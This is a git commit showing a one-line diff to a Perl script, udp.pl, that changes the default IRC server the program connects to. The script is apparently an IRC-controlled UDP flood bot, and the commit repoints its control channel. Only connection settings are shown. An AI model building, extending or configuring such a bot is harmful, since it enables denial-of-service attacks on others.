dcf185955dcdf7d390f45b277fd99d76ce8fc54c
7amudaa <120391197+7amudaa@users.noreply.github.com>
2023-12-22 21:40:58 +0300

    Update udp.pl

--- udp.pl
+++ udp.pl
@@ -133,7 +133,7 @@ chop (my $realname = $rircname[rand scalar @rircname]);
 my $nick =$rircname[rand scalar @rircname];
 
 
-$server = 'irc.do-dear.com' unless $server;
+$server = 'irc.undernet.org' unless $server;
 my $port = '6667';
  
 my $linas_max='8';
